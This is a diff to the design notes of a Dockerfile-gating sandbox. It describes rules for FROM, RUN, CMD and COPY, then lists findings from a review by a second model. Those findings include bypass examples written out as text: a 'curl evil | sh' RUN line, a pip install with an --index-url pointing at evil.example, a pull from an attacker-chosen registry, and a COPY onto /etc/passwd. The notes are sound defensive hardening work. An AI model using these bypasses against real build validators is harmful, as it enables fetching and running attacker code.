@@ -22,9 +22,10 @@ Four rules worth naming:
    another.
 2. `FROM` may not name a registry host. `evil.attacker.com/img:1` is a valid reference,
    and building it makes the daemon pull from a host the attacker chose.
-3. `RUN` may contain no shell metacharacter at all, and must begin with one of five
-   allowlisted commands. The allowlist alone would be worthless, because
-   `apt-get update && curl evil | sh` starts with an allowed prefix.
+3. `RUN` is exec form, like `CMD` and `ENTRYPOINT`. There is no shell, so its arguments
+   are a list we check one at a time rather than a string we match a prefix against.
+   Every argument after the command must be a named package or one of four flags, so a
+   URL, a git reference, a local path, or `--index-url` is refused.
 4. `CMD` and `ENTRYPOINT` must be exec form. Shell form re-splits inside `/bin/sh -c`,
    which is the string-versus-list problem the sandbox already refuses to make with the
    docker command itself.
@@ -32,8 +33,40 @@ Four rules worth naming:
 A digest is refused even though it pins harder than a tag, because a digest pins to one
 architecture and the laptop is arm64 while CI is amd64.
 
+Characters that Python's `splitlines` treats as line breaks and Docker does not are
+refused outright. Without that, the gate and Docker can read different files from the
+same bytes, and every per-line rule is reasoning about a file that will never be built.
+Parser directives are refused for the same reason: `# escape=` changes which character
+continues a line.
+
+## What a second model found in the gate, 2026-08-24
+Three real findings, all reproduced against the function before anything changed.
+
+`RUN` as a string prefix meant `pip install` also matched
+`pip install --index-url https://evil.example/ foo`, along with URLs, git references,
+local paths and `--target /etc`. The allowlist read as "only installs happen here" while
+permitting a fetch from any host during the one phase that has network. Moving `RUN` to
+exec form is what closed it, because arguments became inspectable individually.
+
+The metacharacter ban refused `pip install "flask>=2.0"`. `>` and `<` are redirection
+operators and version-specifier operators at once, and a raw character scan cannot tell
+them apart, so the normal way to pin a dependency was refused and the repair evidence
+pointed at the wrong problem. Exec form removes the shell, so the ban is unnecessary
+rather than merely relaxed. Verified against a real build: exec-form `RUN` resolves
+through `PATH` and `flask>=2.0,<4` installs as 3.1.3.
+
+`COPY` checked its source and ignored its destination, so `COPY s.py /etc/passwd` and
+`COPY s.py /usr/local/bin/python` both passed. The contents were attacker-controlled
+either way, so it granted nothing new, but there is no reason a build should choose
+where they land. Destinations must now be under `/app/`.
+
+One finding was not a bypass and is worth keeping in view: Docker Hub is not a trust
+boundary. Anyone can publish there, so `FROM eviluser/backdoor:1.0` is inside the rules
+as written. The registry-host rule stops the daemon pulling from a host the attacker
+named; it does not make the image trustworthy.
+
 Sitting 4 of 11 complete: `envforge/agent.py` and `tests/test_agent.py`.
-135 tests, 123 needing neither Docker nor an API key, 12 against the real daemon.
+159 tests, 146 needing neither Docker nor an API key, 13 against the real daemon.
 
 ## What sitting 4 produced
 The plain repair loop. It defines `write_dockerfile` against the schema `Tool` already
